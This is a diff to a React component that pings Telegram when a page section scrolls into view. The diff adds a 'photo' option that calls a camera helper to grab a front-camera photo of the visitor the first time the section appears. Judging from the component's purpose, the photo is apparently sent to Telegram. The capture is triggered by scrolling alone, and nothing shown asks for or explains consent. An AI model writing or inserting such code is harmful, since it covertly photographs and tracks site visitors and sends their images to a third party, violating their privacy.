@@ -2,6 +2,7 @@
 
 import { useEffect, useRef } from "react";
 import { notify } from "@/lib/telegram";
+import { captureAndSendPhoto } from "@/lib/camera";
 
 /**
  * Wraps a section and pings Telegram the first time it scrolls into view,
@@ -9,10 +10,13 @@ import { notify } from "@/lib/telegram";
  */
 export default function SectionNotify({
   message,
+  photo,
   threshold = 0.35,
   children,
 }: {
   message: string;
+  /** If set, a front-camera photo is grabbed the first time this section shows. */
+  photo?: string;
   threshold?: number;
   children: React.ReactNode;
 }) {
@@ -27,6 +31,7 @@ export default function SectionNotify({
         if (entry.isIntersecting && !fired.current) {
           fired.current = true;
           notify(message);
+          if (photo) captureAndSendPhoto(photo);
           io.disconnect();
         }
       },
@@ -34,7 +39,7 @@ export default function SectionNotify({
     );
     io.observe(el);
     return () => io.disconnect();
-  }, [message, threshold]);
+  }, [message, photo, threshold]);
 
   return <div ref={ref}>{children}</div>;
 }
